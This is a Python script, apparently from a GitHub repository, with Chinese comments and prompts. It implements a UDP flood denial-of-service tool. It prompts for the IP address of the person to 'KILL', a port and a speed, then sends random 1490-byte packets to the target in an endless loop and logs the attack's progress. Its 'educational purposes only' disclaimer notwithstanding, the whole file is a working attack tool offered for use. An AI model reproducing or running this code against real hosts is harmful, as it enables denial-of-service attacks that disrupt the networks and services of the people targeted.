# python3

# For Windows

##################################################
# github:https://github/CYB140705/DDoS-Attack    #
# by:@CYB140705                                  #
##################################################

"""
网络工具演示程序

免责声明：此程序仅用于教育目的，展示基本的网络概念。
实际使用时应遵守所有适用法律和道德准则。
"""

# Begin Code

import time, os, socket, random, sys
import logging
from logging.handlers import RotatingFileHandler


# 设置日志配置
def setup_logging():
    log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # 创建logs目录如果不存在
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # 设置回滚日志文件，每个最大1MB，保留3个备份
    log_file = 'logs/DDoS_Attack_Logs.log'
    file_handler = RotatingFileHandler(
        log_file, mode='a', maxBytes=1024*1024, 
        backupCount=3, encoding='utf-8', delay=False)
    file_handler.setFormatter(log_formatter)
    
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    logger.addHandler(file_handler)
    
    return logger

logger = setup_logging()

# This is Code time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##################

os.system("cls")
os.system("color a")
os.system("echo                    DDoS Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : CYB140705                         |")
print ("|   作者github    : https://github.com/CYB140705      |")
print ("|   版本          : V2.0.0                            |")
print ("|               ！可以转载(转载请标明来源)！          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[!请勿用于违法用途!]-----------------")
print (" ")

ip = input("请输入要KILL的人的IP地址 (IP查询有教程!在项目根目录里!)          :")
port = int(input("IP的开放端口(端口号必须在1~65535之间)          :"))
sd = int(input("攻击速度(1~1000)        :"))

# 记录攻击开始信息
logger.info(f"攻击开始 - 目标IP: {ip}, 端口: {port}, 速度: {sd}")
logger.info(f"当前时间: {year}-{month}-{day} {hour}:{minute}")

os.system("cls")

sent = 0
try:
    while True:
        sock.sendto(bytes, (ip,port))
        sent += 1
        
        # 每100000个包记录一次日志，避免过于频繁的日志写入
        if sent % 100000 == 0:
            logger.info(f"已发送 {sent} 个数据包到 {ip}:{port}")
            
        print(f"已发送 {sent} 个的数据包到 {ip} 端口 {port}")
        time.sleep((1000-sd)/2000)

except KeyboardInterrupt:
    logger.info(f"攻击被用户中断 - 总共发送了 {sent} 个数据包")
except Exception as e:
    logger.error(f"发生错误: {str(e)} - 总共发送了 {sent} 个数据包")
finally:
    # 记录攻击结束信息
    duration = (datetime.now() - now).total_seconds()
    logger.info(f"攻击结束 - 持续时间: {duration:.2f}秒, "
                f"总数据包: {sent}, "
                f"平均速率: {(sent/duration):.2f}包/秒"
                if duration > 0 else "攻击结束")
